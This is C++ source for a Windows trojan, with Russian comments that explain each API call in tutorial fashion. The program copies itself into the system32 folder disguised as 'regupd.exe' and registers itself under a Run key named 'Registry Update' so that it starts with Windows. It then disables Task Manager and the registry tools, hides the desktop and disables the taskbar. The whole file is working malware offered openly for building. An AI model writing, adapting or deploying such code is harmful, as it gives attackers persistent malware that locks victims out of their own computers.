#include "stdafx.h"  //Сначала надо подключить заголовочный файл windows.h. В нем содержаться описания всех API – функций, все 
#include "vir.h"	 //общие макросы и все типы данных, используемые различными функциями и подсистемами. Так же в файле  
#include "Trojan.h"  //windows.h подключается файл windef.h, в котором определена константа MAX_PATH (ей мы будем пользоваться далее).

int APIENTRY _tWinMain(HINSTANCE hInstance,
HINSTANCE hPrevInstance,LPTSTR lpCmdLine,int nCmdShow)
{
char system[MAX_PATH];       //Буферные переменные, в первой будет храниться путь к папке с системой (system32), 
char pathtofile[MAX_PATH];   //а во второй - путь к нашему «вирусу».

HMODULE GetHModule=GetModuleHandle(NULL); //тип HMODULE(дескриптор файла),HMODULE описывает содержимое файла и его структуру.
//с параметром NULL возвращает дескриптор файла, используемого для создания вызывающего процесса.
GetModuleFileName(GetHModule, pathtofile, sizeof(pathtofile)); //записывает в переменную pathtofile путь к файлу с дескриптором 
//HModule. Теперь у нас в переменной pathtofile хранится путь к нашему файлу.
GetSystemDirectory(system, sizeof(system)); // копирует путь к папке system32 в переменную system.

strcat(system, "\\regupd.exe"); //мы добавляем к переменной system (в которой хранится путь к папке system32) строку «\\regupd.exe», 
//именно так будет называться наша программка в папке с системой.

CopyFile(pathtofile, system, false); //копируем файл, который расположен по пути из pathtofile, в место, в переменной system. 
//Параметр false значит, что если такой файл существует, то он будет заменен.

HKEY hKey; //объявляется переменная типа HKEY(дескриптор ключа реестра).

RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey); 
//открываем нужный ключ реестра. 1ый параметр идентифицирует дескриптор ключа реестра, 2ой параметр - адрес имени открываемого 
//подключа(пути к программам, запускаемых при запуске системы),3ий параметр - зарезервированный -> равен нулю. 4ый параметр 
//определяет тип доступа для нашего ключа. Используемое нами значение применяется для права устанавливать значения подключей. 
//5ый параметр - адрес переменной, куда возвращается дескриптор открытого ключа.
RegSetValueEx(hKey, " Registry Update",0,REG_SZ,(const unsigned char*)system,sizeof(system));
//сохраняет данные в поле значения открытого ключа реестра. 1ый параметр идентифицирует открытый в текущий момент ключ. 
//2ой параметр является адресом имени устанавливаемого значения, если значения с таким именем не существует, функция создаст его. 
//3ий параметр -> нуль. 4ый - тип значения добавляемой переменной "REG_SZ" значит, что ключ содержит строковое значение. 
//5ый и 6ой - адрес строки, содержащей значение и ее размер.

RegCloseKey(hKey); //закрывает дескриптор ключа.

DWORD value=1;//Для присвоения значения, вместо 0.

RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
RegSetValueEx(hKey, "DisableTaskMgr", NULL, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
RegCloseKey(hKey); //Запрет диспетчера задач.

RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
RegSetValueEx(hKey, "DisableRegistryTools", NULL, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
RegCloseKey(hKey); //Запрет Панели Инструментов.

RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, KEY_ALL_ACCESS, &hKey);
RegSetValueEx(hKey, "NoDesktop", NULL, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
RegCloseKey(hKey); //Скрыть рабочий стол.

HWND hTaskBar;

hTaskBar = FindWindow("Shell_TrayWnd",NULL);
EnableWindow(hTaskBar,!value);

return 0;
}